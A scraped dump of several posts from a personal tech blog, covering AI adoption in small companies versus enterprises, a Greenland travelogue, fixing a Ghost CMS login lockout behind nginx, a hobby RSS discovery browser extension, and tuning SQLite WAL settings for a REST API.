over production databases with no control, and as I've covered , sandboxing agents is difficult [2] . However, this does cause a real problem in so much that you don't have an engineering team that can help build the infrastructure to run safely sandboxed agents against your datasets. The gap I've also spoken to many smaller companies that don't have all this baggage and are absolutely flying with AI. The gap is so obvious when you can see both sides of it. On one hand, you have Microsoft's (awful) Copilot integration for Excel (in fairness, the Gemini integration in Google Sheets is also bad). So you can imagine financial directors trying to use it and it making a complete mess of the most simple tasks and never touching it again. On the other you have a non-technical executive who's got his head round Claude Code and can run e.g. Python locally. I helped one recently almost one-shot [3] converting a 30 sheet mind numbingly complicated Excel financial model to Python with Claude Code. Once the model is in Python, you effectively have a data science team in your pocket with Claude Code. You can easily run Monte Carlo simulations, pull external data sources as inputs, build web dashboards and have Claude Code work with you to really integrate weaknesses in your model (or business). It's a pretty magical experience watching someone realise they have so much power at their fingertips, without having to grind away for hours/days in Excel. This effectively leads to a situation where smaller company employees are able to be so much more productive than the equivalent at an enterprise. It often used to be that people at small companies really envied the resources &amp; teams that their larger competitors had access to - but increasingly I think the pendulum is swinging the other way. The future I'm starting to get a feel for what the future of work looks like. The first observation is that (often) the real leaps are being made organically by employees, not from a top down AI strategy. Where I see the real productivity gains are small teams deciding to try and build an AI assisted workflow for a process, and as they are the ones that know that process inside out they can get very good results - unlike an often outsourced software engineering team who have absolutely zero experience doing the process that they are helping automate. I think this is the opposite of what most 'digital transformation' projects looked like in enterprise. Secondly, companies that have some sort of APIs for internal systems are going to be able to do far more than those that don't. This might be as simple as a readonly data warehouse employees can connect to and run queries on behalf of users, or it could be as far as many complex core business processes being completely APId. Thirdly, this all needs to be wrapped up in some sort of secure mechanism, but I actually think a hosted VM running some sort of code agent with well thought through network restrictions would work well, at least for read only reporting. For creating and editing data I don't think we quite have the model for non technical users (especially) to be able to use agents safely (yet). Finally, legacy enterprise SaaS players either have enormous lock in, or are extremely vulnerable depending on how you look at it. Most are not \"API-first\" products, and the APIs they have tend to be really for developer usage - not optimised for thousands of employees to ping in weird and wonderful inefficient ways. But if they are the source of truth for the company, they are going to be very difficult to migrate away from and bottleneck a lot of productivity gains. Again, smaller companies tend to use newer products which have far better thought through APIs (simply because they weren't often originally created many decades ago with various interfaces grafted on over time). The user prompts, the agent synthesises - connecting to APIs and producing outputs on demand. What I've come to realise is that the power of having a bash sandbox with a programming language and API access to systems, combined with an agentic harness, results in outrageously good results for non technical users. It can effectively replace nearly every standard productivity app out there - both classic Microsoft Office style ones - and also web apps. It can build any report you ask for - and export it however you like. To me this seems like the future of knowledge work. The bifurcation is real and seems to be, if anything, speeding up dramatically. I don't think there's ever been a time in history where a tiny team can outcompete a company one thousand times its size so easily. Microsoft is using Claude Code internally while selling you Copilot \u21a9\ufe0e Let's keep in mind that users already have access to these systems. CISOs need to figure out how to enable these kind of secure VMs en masse. There's already precedent for this with Codespaces - it just requires a similar approach scaled up to the entire organisation. \u21a9\ufe0e Two or three prompts got it there, using plan mode to figure out the structure of the Excel sheet, then prompting to implement it. It even added unit tests to the Python model itself, which I was impressed with! \u21a9\ufe0e If you found this useful, I write about AI tooling and software development monthly. Subscribe here or drop your email: Subscribe</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:00</p>"},{"location":"matduggan.com/","title":"matduggan.com\\n\\n\u7f51\u7ad9: https://matduggan.com\\nRSS: https://matduggan.com/rss/\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- The Year of the 3D Printed Miniature (And Other Lies We Tell Ourselves)_20260205\\n- SQLite for a REST API Database-_20260205\\n- Making RSS More Fun_20260205\\n- I broke and fixed my Ghost blog_20260205\\n- Greenland is a beautiful nightmare_20260205\\n","text":""},{"location":"matduggan.com/Greenland%20is%20a%20beautiful%20nightmare_20260205/","title":"Greenland is a beautiful nightmare\\n\\n\u6765\u6e90: https://matduggan.com\\n\u94fe\u63a5: https://matduggan.com/greenland-is-a-beautiful-nightmare/\\n\u65e5\u671f: Sat, 27 Sep 2025 08:56:13 GMT\\n\\n---\\n\\nGreenland is a complicated topic here in Denmark. The former colony that is still treated a bit like a colony is something that inspires a lot of emotions. Greenland has been subjected to a lot of unethical experiments by Denmark, from taking their kids to wild experiments in criminal justice. But there is also a genuine pride a lot of people have here for the place and you run into Danes who grew up there more often than I would have guessed.\\nWhen the idea of going to Greenland was introduced to me, I was curious. Having lived in Denmark for awhile, you hear a lot about the former colony and its 55,000 residents. We were invited by a family that my wife was close with growing up and is Danish. They wanted to take their father back to see the place he had spend some time in during his 20s and had left quite an impression. A few drinks in, I said \"absolutely let's do it\", not realizing we had already committed to going and I had missed the text message chain.\\nA few weeks before I went, I realized \"I don't know anything about Greenland\" and started to watch some YouTube videos. It was about this time when I started to get a pit in my stomach, the \"oh god I think I've made a huge mistake\" feeling I'm painfully familiar with after a career in tech.  Greenland appeared to have roughly 9 people living there and maybe 5 things to look at. Even professional travel personalities seemed to be scraping the bottom of the barrel. \"There's the grocery store again!\" they would point out as they slipped down the snowy roads. I couldn't  tell any difference between different towns in the country.\\nIt reminded me a lot of driving through Indiana. For those not in the US, Indiana is a state in the US famous for being a state one must drive through in order to get somewhere better. If you live in Michigan, a good state and want to go to Illinois, another good state, one must pass through Indiana, a blank state. Because of this little strip here, you often found yourself passing through this place.\\nDriving through Indiana isn't bad, it's just an empty void. It's like a time machine back to the 90s when people still smoke in restaurants but also there's nothing that sticks out about it. There is nothing distinct about Indiana, it's just a place full of people who got too tired on their way to somewhere better and decided \"this is good enough\". The difference is that Greenland is very hard to get to, as I was about to learn.\\nFinally the day arrived. Me, my wife, daughter, 4 other children and 6 other adults all came to the Copenhagen Airport and held up a gate agent for what felt like an hour to slowly process all of our documents. Meanwhile, I nursed a creeping paranoia that I'd be treated as some sort of American spy, given my government's recent hobby of threatening to purchase entire countries like they're vintage motorcycles on Craigslist.\\nThe 5 hour flight is uneventful, the children are beautifully behaved and I begin to think \"well this seems ok!\" like the idiot I am. As I can look down and see the airport, the pilot comes on and informs us that there is too much fog to land safely.\\nSurely fog cannot stop a modern aircraft full of all these dials and screens\\nI think, foolishly. We are informed there is enough fuel to circle the airport for 5 hours to wait for the fog to lift.\\nWhat followed was three hours of flying in lazy circles, like a very expensive, very slow merry-go-round. After the allotted time, we are informed that we must fly to Iceland to refuel and then\\nwe will be returning to Denmark\\n. After a total of 15 hours in the air we will be going back to exactly where we started, to do the entire thing again. We were obviously upset at this turn of events, but I noticed the native Greenlandic folks seemed not surprised at this turn of events. As I later learned, this happens\\nall the time\\n.\\nThe native Greenlanders on board seemed utterly unsurprised by this development, displaying the kind of resigned familiarity that suggested this was Tuesday for them. I began wondering if I could just pretend Iceland was Greenland\u2014surely my family wouldn't notice the difference? But the pilot, apparently reading my mind, announced that no one would be disembarking in Iceland. It felt oddly authoritarian, like being grounded by an airline, as if they knew we'd all just wander off into Reykjavik and call it close enough.\\nWe crash out in a airport hotel 20 minutes from our apartment after 15 hours in the air and tons of CO2 emissions only to wake up the next day to start again. This time, I notice that all of the people are asking for (and receiving) free beer from the crew that they are stashing in their bags. It turns out soda and beer, really anything that needs to be imported, is pretty expensive in Greenland. The complimentary drinks are there to be kept for later.\\nFinally we land. The first thing you notice when you land in Greenland is there are no trees or grass. There is snow and then there is exposed rock. The exterior of the airport is metal but the inside is wood, which is strange because again there are no trees. This would end up being a theme, where buildings representing Denmark were made out of lots of wood, almost to ensure that you understood they weren't from here. We ended up piling all of our stuff into a bus and heading for the hotel in Nuuk.\\nNuuk\\nNuuk is the capital of Greenland and your introduction to the incredible calm of the Greenlandic people. I have never met a less stressed out group of humans in my life. Nobody is really rushing anywhere, it's all pretty quiet and calm. The air is cold and crisp with lots of kids playing outside and just generally enjoying life.\\nThe city itself sits in a landscape so dramatically inhospitable it makes the surface of Mars look cozy. Walking through the local mall, half the shops sell gear designed to help you survive what appears to be the apocalypse. Yet somehow, there's traffic. Actual traffic jams in a place where you can walk from one end to the other in twenty minutes. It's like being stuck behind a school bus in your own driveway.\\nTo put this map into some perspective, it is only six kilometers from the sorta furthest tip to the airport.\\nBut riding the bus around Nuuk was a peaceful experience that lets you see pretty much the entire city without needing to book a tour or spend a lot of money. We went to Katuaq, a cultural center with a cafe and a movie theater that was absolutely delicious food.\\nBut again even riding the bus around it is impossible to escape the feeling that this is a fundamentally hostile to human life place. The sun is bright and during the summer its pretty hot, with my skin feeling like it was starting the burn pretty much the second it was exposed to the light. It's hard to even dress for, with layers of sunscreen, bug spray and then something warm on top if you suddenly got cold.\\nThe sun, meanwhile, has apparently forgotten how to set, turning our hotel rooms into solar ovens. You wake up in a pool of your own sweat, crack a window for relief, and immediately get hit with air so cold it feels personal. It's like being trapped in a meteorological mood swing.\\nSo after a night here, we went back to the airport again and flew to our final destination, Ilulissat.\\nIlulissat\\nMy new favorite airport\\nThe flight to our final destination revealed Greenland's true nature: endless, empty hills stretching toward infinity, punctuated by ice formations that look like nature's sculpture garden.\\nLanding in Ilulissat felt like victory\u2014we'd made it to the actual destination, not just another waypoint in our Arctic odyssey. Walking through the tiny airport, past Danish military recruitment posters (apparently someone, somewhere, thought this place needed defending), I felt genuinely optimistic for the first time in days.\\nWell you can sleep easy Danish military, because Ilulissat is completely protected from invasion. The second I stepped outside I was set upon by a flood of mosquitos like I have never experienced before. I have been to the jungles of Vietnam, the swamps of Florida and the Canadian countryside. This was beyond anything I've ever experienced.\\nThere are bugs in my mouth, ears, eyes and nose almost immediately. The photo below is not me being dramatic, it is actually what is required to keep them off of me.\\nIn fact what you need to purchase in order to walk around this area at all are basically bug nets for your face. They're effectively plastic mesh bags that you put on.\\nThe Dogs\\nOur hotel, charming in that \"remote Arctic outpost\" way, sat adjacent to what I can only describe as a canine correctional facility. Dozens of sled dogs were chained to rocks like some sort of prehistoric parking lot, each with a tiny house they could retreat to when the existential weight of their circumstances became too much.\\nNow, I'd always imagined sled dogs living their best life\u2014running through snow, tongues lolling, living the Disney version of Arctic life. I'd never really considered their downtime, assuming they frolicked in meadows or something equally wholesome. The reality was more \"minimum security prison with a view.\"\\nThe dogs are visited roughly twice a day by the person who owns and feeds them, which was quite the party for the dogs that lost their minds whenever the car pulled up. Soon the kids really looked forward to dog feeding time. The fish scrapes the dogs lived on came out of a chest freezer that was left exposed up on the rock face without electricity and you could smell it from 50 yards away when it opened.\\nDuring one such performance, a fellow parent leaned over and whispered with the casual tone of someone commenting on the weather, \"I think that one is dead.\" Before I could process this information, the frozen canine was unceremoniously launched over a small cliff like a furry discus. A second doggy popsicle followed shortly after, right in front of our assembled children, who watched with the kind of wide-eyed fascination usually reserved for magic shows.\\nWe stopped making dog feeding time a group activity after that and had to distract the kids from ravens flying away with tufts of dog fur.\\nWhales taste like seaweed\\nObviously a big part of Greenland is the nature, specifically the icebergs. Icebergs are incredible and during the week we spend up there, I enjoyed watching them every morning. It's like watching a mountain slowly moving while you sit still. The visual contrast of the ice and the exposed stone is beautiful and peaceful.\\nFinding our tour operator proved to be an exercise in small-town efficiency. The man who gave me directions was the same person who picked us up from the airport, who was also our tour guide, who probably doubled as the mayor and local meteorologist. It was like a one-man civic operation disguised as multiple businesses\u2014the ultimate small-town gig economy.\\nThe sea around Greenland is calmer than anything I've ever been on before, perfectly calm and serene. All around us whales emerged, thrilling my daughter. However the biggest hit of the entire tour, maybe the entire trip, was a member of the crew who handed each of the kids a giant rock of glacier ice to eat. I had to pull my daughter away to observe the natural beauty as she ate glacier ice like it was ice cream. \"LOOK AT MY ICE\" she was yelling as they slipped and slid around the deck of this boat.\\nSo if you've ever wonder \"what is a glacier\", let me tell you. Greenland has a lot of ice and it pushes out from the land that is covers into the sea. When that happens, a lot of it breaks off. This sounds more exciting than it is. On TV in 4K it looks incredible, giant mountains of ice falling into the ocean. Honestly you can go read the same thing I did\\nhere\\n.\\nHowever that doesn't happen very often. So in order for us tourists to be able to see anything, we had to go to a very productive glacier. This means there are constantly small chunks breaking off and falling into the sea. Practically though, it kinda looks like you are a boat in a slushee. It's beautiful and something to see, but also depressing to see along the rock face how much more ice there used to be.\\nBack in town, we hopped on the \"bus\". Now the bus here is clearly a retrofitted party van, complete with blue LED lights. The payment system is zip tied to a desk chair that is, itself, wedged in the front. However the bus works well and does get you around. The confusing part is that you will, once again, sometimes encounter a lot of traffic. People are driving pretty quickly and really seem to have somewhere to go. You also see a lot of fancy cars parked outside of houses here.\\nWhich begs a pretty basic question. If there was almost nowhere to drive to in Nuuk, where in the\\nhell are these people driving\\n. The distance between the end of the road and the beginning of the road is less than 6 km. Also the process to make a road here is beyond anything you've ever seen. Everything requires a giant pile of explosives.\\nWhere did these vehicles even come from? Why does one ship a BMW to a place accessible only by plane and boat? More importantly, where was everyone going with such determination? It was like watching a very expensive version of bumper cars, except everyone was committed to the illusion that they had somewhere important to be. Everyone had dings and scrapes like crashes were common.\\nGrocery Store from the Sea\\nAnyway, as I dodged speeding cars filled with people heading nowhere, I decided to hop off the bus and head to the grocery store. Inside was less a store and more the idea of a store. There was a lot of alcohol, chips, candy and shelf-stable foods, which all makes sense to me. What was strange was there wasn't a lot else, including meat. Locals couldn't be eating at the local restaurants, where the prices were as high as Berlin or Copenhagen for food. So what were they eating?\\nWhen I asked one of my bus drivers, he told me that it was pretty unusual to buy meat. They purchased a lot of whale and seal meat. I had sorta heard this before, but when we stopped the bus he pointed out a group of men hauling guns out into a small boat to go shoot seals. The guns were held together with a surprising amount of duct tape, which is not something I associate with the wild.\\nI had assumed, based on my casual reading of the news, that we were\\nmostly\\ndone killing whales. As it turns out, I was wrong. They eat a lot of whale and it is, in fact, not hard to find. If you are curious, whale does not taste fishy. It tastes a little bit like if you cooked reindeer in a pot of seaweed. I wouldn't go out of your way for it, but it's not terrible.\\nThe argument I've always heard for why people still kill whales is because it's part of their culture and also because it's an important source of protein. When you hear the phrase \"part of their culture\" I always imagined like traditional boats going out with spears. What I didn't imagine was industrial fishing boats and an industrial crane that lifts the dead whale out of the water for \"processing\". Some of the illusion is broken when your boat tour guide points out the metal warehouse with the word \"whale\" on the side. \"Yeah the water here was red with blood for a week\" the guide said, counting the cigarettes left in a pack he had.\\nShould you go to Greenland?\\nIt's a wild place unlike anywhere I've ever been. It is the closest I have ever felt to living a sci-fi type experience. The people of Greenland are amazing, tough, calm and kind. I have nothing but positive experiences to recount from the many people I met there, Danish and Greenlandic, who patiently sat through my millions of questions.\\nHowever it is, by far, the least hospitable to human life place I've ever been to. The folks who live there have adapted to the situation in, frankly, genius ways. If that's your idea of a good time, Greenland is perfect for you. Maybe don't get emotionally attached to the sled dogs though. Or the whales.","text":""},{"location":"matduggan.com/I%20broke%20and%20fixed%20my%20Ghost%20blog_20260205/","title":"I broke and fixed my Ghost blog\\n\\n\u6765\u6e90: https://matduggan.com\\n\u94fe\u63a5: https://matduggan.com/i-broke-and-fixed-my-ghost-blog/\\n\u65e5\u671f: Thu, 16 Oct 2025 12:00:29 GMT\\n\\n---\\n\\nOnce a month I will pull down the latest docker images for this server and update the site. The Ghost CMS team updates things at a pretty regular pace so I try to not let an update sit for too long.\\nWith this last round I suddenly found myself locked out of my Ghost admin panel. I was pretty confident that I hadn't forgotten my password and when I was looking at the logs, I saw this pretty spooky error.\\nblog-1               | [2025-10-15 11:36:29] ERROR \"GET /ghost/api/admin/users/me/?include=roles\" 403 188ms","text":"<p>blog-1               | blog-1               | Authorization failed blog-1               | blog-1               | \"Unable to determine the authenticated user or integration. Check that cookies are being passed through if using session authentication.\" blog-1               | blog-1               | Error ID: blog-1               |     5b3ec250-aa84-11f0-bb51-b7057fc0f6b0 blog-1               | blog-1               | ---------------------------------------- blog-1               | blog-1               | NoPermissionError: Authorization failed blog-1               |     at authorizeAdminApi (/var/lib/ghost/versions/5.130.5/core/server/services/auth/authorize.js:33:25) blog-1               |     at Layer.handle [as handle_request] (/var/lib/ghost/versions/5.130.5/node_modules/express/lib/router/layer.js:95:5) blog-1               |     at next (/var/lib/ghost/versions/5.130.5/node_modules/express/lib/router/route.js:149:13) blog-1               |     at authenticate (/var/lib/ghost/versions/5.130.5/core/server/services/auth/session/middleware.js:55:13) blog-1               |     at process.processTicksAndRejections (node:internal/process/task_queues:95:5) blog-1               | blog-1               | [2025-10-15 11:36:29] ERROR \"GET /ghost/api/admin/users/me/?include=roles\" 403 13ms\\nI was surprised by this sudden error, especially when I dumped out the database and confirmed that the hashed password for my Ghost user matched the password I was giving it. If you want to try that, this is the guide I followed:\\nhttps://hostarmada.com/tutorials/blog-cms/ghost/how-to-change-the-admin-password-of-your-ghost-blog-if-you-get-locked-out/\\nMaybe I messed up the Nginx?\\nSo Ghost is a good CMS system, but it can be a little bit slow under load from automated scraping from RSS readers. I want to cache everything that I can with Nginx, so I use Nginx to store a lot of that junk. My configuration is not too terribly clever and has worked up to this point.\\nmap $sent_http_content_type $expires {       default                    off;       text/css                   max;       application/javascript     max;       ~image/                    max;   }</p> <p>server {       listen 80;       listen [::]:80;       server_name matduggan.com www.matduggan.com;       return 301 https://$server_name$request_uri;  # Changed to 301 (permanent)   }</p> <p>proxy_cache_path /tmp/cache levels=1:2 keys_zone=STATIC:512m inactive=24h max_size=10g;   client_max_body_size 1000M;</p> <p>server {       listen 443 ssl http2;       listen [::]:443 ssl http2;</p> <pre><code>  server_name matduggan.com www.matduggan.com;\n\n  charset UTF-8;\n\n  # SSL Configuration\n  ssl_certificate         /etc/ssl/cert.pem;\n  ssl_certificate_key     /etc/ssl/key.pem;\n  ssl_client_certificate  /etc/ssl/cloudflare.crt;\n  ssl_verify_client on;\n\n  # Modern TLS settings\n  ssl_protocols TLSv1.2 TLSv1.3;\n  ssl_prefer_server_ciphers off;  # Let client choose (better for TLS 1.3)\n  ssl_session_cache shared:SSL:10m;\n  ssl_session_timeout 10m;\n  ssl_buffer_size 4k;\n\n  # Security headers\n  add_header Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\" always;\n  add_header X-Frame-Options \"SAMEORIGIN\" always;\n  add_header X-Content-Type-Options \"nosniff\" always;\n  add_header X-XSS-Protection \"1; mode=block\" always;\n\n  # Compression\n  gzip on;\n  gzip_vary on;\n  gzip_proxied any;\n  gzip_comp_level 6;\n  gzip_types text/plain text/css text/xml text/javascript application/json application/javascript application/xml+rss application/rss+xml font/truetype font/opentype\n</code></pre> <p>application/vnd.ms-fontobject image/svg+xml;</p> <pre><code>  expires $expires;\n\n  # Ghost admin and protected routes - no caching\n  location ~ ^/(ghost/|p/|\\.ghost/|members/) {\n      proxy_set_header Host $http_host;\n      proxy_set_header X-Real-IP $remote_addr;\n      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n      proxy_set_header X-Forwarded-Proto $scheme;\n      proxy_set_header X-Forwarded-Host $http_host;\n      proxy_buffering off;\n      proxy_cache_bypass 1;\n      proxy_no_cache 1;\n      add_header Cache-Control \"no-cache, no-store, must-revalidate\";\n      proxy_pass http://127.0.0.1:8080;\n  }\n\n  # Public content - cached\n  location / {\n      proxy_set_header Host $http_host;\n      proxy_set_header X-Real-IP $remote_addr;\n      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n      proxy_set_header X-Forwarded-Proto $scheme;\n\n      proxy_buffering on;\n      proxy_cache STATIC;\n      proxy_cache_valid 200 1d;\n      proxy_cache_use_stale error timeout invalid_header updating http_500 http_502 http_503 http_504;\n      proxy_cache_bypass $http_cache_control;\n\n      add_header X-Cache-Status $upstream_cache_status;\n\n      proxy_pass http://127.0.0.1:8080;\n      proxy_redirect off;\n  }\n</code></pre> <p>}\\nThe basic point is to get caching on the public content and then definitely NOT cache the ghost admin panel. After some testing, I confirmed this seemed to all work. But I was still locked out.\\nTo the changelog!\\nAlright so I still couldn't figure out what was going on, so I went through the docs. Then I found this seemingly new addition.\\nhttps://docs.ghost.org/config?_ga=2.92846045.1713439663.1760543217-1048546310.1760543217#security\\nNow I have transactional email set up, but just looking at the error it seemed to feel related. So I added:\\nsecurity__staffDeviceVerification: false\\nto my docker-compose file to disable this new feature and then blamo, suddenly works fine.\\nSo if you are locked out of your Docker CMS admin panel, disable this (temporarily hopefully because it's a good feature) to let you continue to log in, debug your transactional email and then turn it back on. Hope that helps.</p>"},{"location":"matduggan.com/Making%20RSS%20More%20Fun_20260205/","title":"Making RSS More Fun\\n\\n\u6765\u6e90: https://matduggan.com\\n\u94fe\u63a5: https://matduggan.com/making-rss-more-fun/\\n\u65e5\u671f: Tue, 02 Dec 2025 09:14:45 GMT\\n\\n---\\n\\nI don't like RSS readers. I know, this is blasphemous especially on a website where I'm actively encouraging you to subscribe through RSS. As someone writing stuff, RSS is great for me. I don't have to think about it, the requests are pretty light weight, I don't need to think about your personal data or what client you are using. So as a\\nprotocol\\nRSS is great, no notes.\\nHowever as something I'm going to consume, it's frankly\\na giant chore\\n. I feel pressured by RSS readers, where there is this endlessly growing backlog of things I haven't read. I rarely want to read all of a websites content from beginning to end, instead I like to jump between them. I also don't really care if the content is chronological, like an old post about something interesting isn't less compelling to me than a newer post.\\nWhat I want, as a user experience, is something akin to TikTok. The whole appeal of TikTok, for those who haven't wasted hours of their lives on it, is that I get served content based on an algorithm that determines what I might think is useful or fun. However what I would like is to go through content from random small websites. I want to sit somewhere and passively consume random small creators content, then upvote some of that content and the service should show that more often to other users. That's it. No advertising, no collecting tons of user data about me, just a very simple \"I have 15 minutes to kill before the next meeting, show me some random stuff.\"\\nIn this case the \"algorithm\" is pretty simple: if more people like a thing, more people see it. But with Google on its way to replacing search results with LLM generated content, I just wanted to have something that let me play around with the small web the way that I used to.\\nThere actually used to be a service like this called StumbleUpon which was more focused on pushing users towards popular sites. It has been taken down, presumably because there was no money in a browser plugin that sent users to other websites whose advertising you didn't control.\\nTL;DR\\nYou can go download the Firefox extension now and try this out and skip the rest of this if you want.\\nhttps://timewasterpro.xyz/\\nIf you hate it or find problems, let me know on Mastodon.\\nhttps://c.im/@matdevdug\\nFunctionality\\nSo I wanted to do something pretty basic. You hit a button, get served a new website. If you like the website, upvote it, otherwise downvote it. If you think it has objectionable content then hit report. You have to make an account (because I couldn't think of another way to do it) and then if you submit links and other people like it, you climb a Leaderboard.\\nOn the backend I want to (very slowly so I don't cost anyone a bunch of money) crawl a bunch of RSS feeds, stick the pages in a database and then serve them up to users. Then I want to track what sites get upvotes and return those more often to other users so that \"high quality\" content shows up more often. \"High quality\" would be defined by the community or just me if I'm the only user.\\nIt's pretty basic stuff, most of it copied from tutorials scattered around the Internet. However I\\nreally\\nwant to drive home to users that this is not a Serious Thing. I'm not a company, this isn't a new social media network, there are no plans to \"grow\" this concept beyond the original idea unless people smarter than me ping with me ideas. So I found this amazing CSS library:\\nhttps://sakofchit.github.io/system.css/\\nThe Apple's System OS design from the late-80s to the early 90s was one of my personal favorites and I think would send a strong signal to a user that this is not a professional, modern service.\\nGreat, the basic layout works. Let's move on!\\nBackend\\nSo I ended up doing FastAPI because it's very easy to write. I didn't want to spend a ton of time writing the API because I doubt I nailed the API design on the first round. I use sqlalchemy for the database. The basic API layout is as follows:\\nadmin - mostly just generating read-only reports of like \"how many websites are there\"\\nleaderboard - So this is my first attempt at trying to get users involved. Submit a website that other people like? Get points, climb leaderboard.\\nThe source for the RSS feeds came from the (very cool) Kagi small web Github.\\nhttps://github.com/kagisearch/smallweb\\n. Basically I assume that websites that have submitted their RSS feeds here are cool with me (very rarely) checking for new posts and adding them to my database. If you want the same thing as this does, but as an iFrame, that's the Kagi small web service.\\nThe scraping work is straightforward. We make a background worker, they grab 5 feeds every 600 seconds, they check for new content on each feed and then wait until the 600 seconds has elapsed to grab 5 more from the smallweb list of RSS feeds. Since we have a lot of feeds, this ends up look like we're checking for new content less than once a day which is the interval that I want.\\nThen we write it out to a sqlite database and basically track \"has this URL been reported\", if so, put it into a review queue and then how many times this URL has been liked or disliked. I considered a \"real\" database but honestly sqlite is getting more and more scalable every day and its impossible to beat the immediate start up and functionality. Plus very easy to back up to encrypted object storage which is super nice for a hobby project where you might wipe the prod database at any moment.\\nIn terms of user onboarding I ended up doing the \"make an account with an email, I send a link to verify the email\". I actually hate this flow and I don't really want to know a users email. I never need to contact you and there's not a lot associated with your account, which makes this especially silly. I have a ton of email addresses and no real \"purpose\" in having them. I'd switch to Login with Apple, which is great from a security perspective but not everybody has an Apple ID.\\nI also did a passkey version, which worked fine but the OSS passkey handling was pretty rough still and most people seem to be using a commercial service that handled the \"do you have the passkey? Great, if not, fall back to email\" flow. I don't really want to do a big commercial login service for a hobby application.\\nAuth is a JWT, which actually was a pain and I regret doing it. I don't know why I keep reaching for JWTs, they're a bad user experience and I should stop.\\nCan I just have the source code?\\nI'm more than happy to release the source code once I feel like the product is in a somewhat stable shape. I'm still ripping down and rewriting relatively large chunks of it as I find weird behavior I don't like or just decide to do things a different way.\\nIn the end it does seem to do whats on the label. We have over 600,000 individual pages indexed.\\nSo how is it to use?\\nHonestly I've been pretty pleased. But there are some problems.\\nFirst I couldn't find a reliable way of switching the keyboard shortcuts to be Mac/Windows specific. I found some options for querying platform but they didn't seem to work, so I ended up just hardcoding them as Alt which is not great.\\nThe other issue is that when you are making an extension, you spend a long time working with these manifests.json. The specific part I really wasn't sure about was:\\n\"browser_specific_settings\": {","text":"<pre><code>\"gecko\": {\n  \"id\": \"admin@timewasterpro.xyz\",\n  \"strict_min_version\": \"80.0\",\n  \"data_collection_permissions\": {\n    \"required\": [\"authenticationInfo\"]\n  }\n}\n</code></pre> <p>}\\nI'm not entirely sure if that's all I'm doing? I think so from reading the docs.\\nAnyway I built this mostly for me. I have no idea if anybody else will enjoy it. But if you are bored I encourage you to give it a try. It should be pretty light weight and straight-forward if you crack open the extension and look at it. I'm not loading any analytics into the extension so basically until people complain about it, I don't really know if its going well or not.\\nFuture stuff\\nI need to sort stuff into categories so that you get more stuff in genres you like. I don't 100% know how to do that, maybe there is a way to scan a website to determine the \"types\" of content that is on there with machine learning? I'm still looking into it.\\nThere's a lot of junk in there. I think if we reach a certain number of downvotes I might put it into a special \"queue\".\\nI want to ensure new users see the \"best stuff\" early on but there isn't enough data to determine \"best vs worst\".\\nI wish there were more independent photography and science websites. Also more crafts. That's not really a \"future thing\", just me putting a hope out into the universe. Non-technical beta testers get overwhelmed by technical content.</p>"},{"location":"matduggan.com/SQLite%20for%20a%20REST%20API%20Database-_20260205/","title":"SQLite for a REST API Database?\\n\\n\u6765\u6e90: https://matduggan.com\\n\u94fe\u63a5: https://matduggan.com/sqlite-for-a-rest-api-database/\\n\u65e5\u671f: Fri, 12 Dec 2025 14:19:00 GMT\\n\\n---\\n\\nWhen I wrote the backend for my Firefox time-wasting extension (\\nhere\\n), I assumed I was going to be setting up Postgres. My setup is boilerplate and pretty boring, with everything running in Docker Compose for personal projects and then persistence happening in volumes.\\nHowever when I was working with it locally, I obviously used SQLite since that's always the local option that I use. It's very easy to work with, nice to back up and move around and in general is a pleasure to work with. As I was setting up the launch, I realized I\\nreally didn't\\nwant to set up a database. There's nothing wrong with having a Postgres container running, but I'd like to skip it if its possible.\\nCan you run SQLite for many readers and writers?\\nSo my limited understanding of SQLite before I started this was \"you can have one writer and many readers\". I had vaguely heard of SQLite \"WAL\" but my understanding of WAL is more in the context of shipping WAL between database servers. You have one primary, many readers, you ship WAL to from the primary to the readers and then you can promote a reader to the primary position once it has caught up on WAL.\\nMy first attempt at setting up SQLite for a REST API died immediately in exactly this way.\\nLog Message: Error loading feeds: (sqlite3.OperationalError) database is locked","text":"<p>transaction</p> <p>fastapi.middleware.asyncexitstack.AsyncExitStackMiddleware event_id</p> <p>Log Message: Error loading feeds: (sqlite3.OperationalError) database is locked \u22c4 fastapi.middleware.asyncexitstack.AsyncExitStackMiddleware\\nSo by default SQLite:\\nOnly\\none writer\\nat a time\\nWriters\\nblock readers\\nduring transactions\\nThis seems to be caused by SQLite having a rollback journal and using strict locking. Which makes perfect sense for the use-case that SQLite is typically used for, but I want to abuse that setup for something it is not typically used for.\\nFirst Pass\\nSo after doing some Googling I ended up with these as the sort of \"best recommended\" options. I'm 95% sure I copy/pasted the entire block.\\n@event.listens_for(engine.sync_engine, \"connect\")     def set_sqlite_pragma(dbapi_conn, connection_record):         cursor = dbapi_conn.cursor()         cursor.execute(\"PRAGMA journal_mode=WAL\")         cursor.execute(\"PRAGMA synchronous=NORMAL\")         cursor.execute(\"PRAGMA busy_timeout=60000\")         cursor.execute(\"PRAGMA cache_size=-65536\")         cursor.execute(\"PRAGMA temp_store=MEMORY\")         cursor.close()\\nWhat is this configuration doing.\\nSwitches SQLite from rollback journal to Write-Ahead Logging (WAL)\\nDefault behavior is Write -&gt; Copy original data to journal -&gt; Modify database -&gt; Delete journal.\\nWAL mode is Write -&gt; Append changes to WAL file -&gt; Periodically checkpoint to main DB\\nsynchronous=NORMAL\\nSo here you have 4 options to toggle for how often SQLite syncs to disk.\\nOFF is SQlite lets the OS handle it.\\nNORMAL is the SQLite engine still syncs, but less often than FULL. WAL mode is safe from corruption with NORMAL typically.\\nFULL uses the Xsync method of the VFS (don't feel bad I've never heard of it before either:\\nhttps://sqlite.org/vfs.html\\n) to ensure everything is written to disk before moving forward.\\nEXTRA: I'm not 100% sure what this exactly does but it sounds extra. \"EXTRA synchronous is like FULL with the addition that the directory containing a\\nrollback journal\\nis synced after that journal is unlinked to commit a transaction in DELETE mode. EXTRA provides additional durability if the commit is followed closely by a power loss. Without EXTRA, depending on the underlying filesystem, it is possible that a single transaction that commits right before a power loss might get rolled back upon reboot. The database will not go corrupt. But the last transaction might go missing, thus violating durability, if EXTRA is not set.\"\\nbusy_timeout\\n= please wait up to 60 seconds.\\ncache_size\\nthis one threw me for a loop. Why is it a negative number?\\nIf you set it to a positive number, you mean pages. SQLite page size is 4kb by default, so 2000 = 8MB. A negative number means KB which is easier to reason about than pages.\\nI don't really know what a \"good\" cache_size is here. 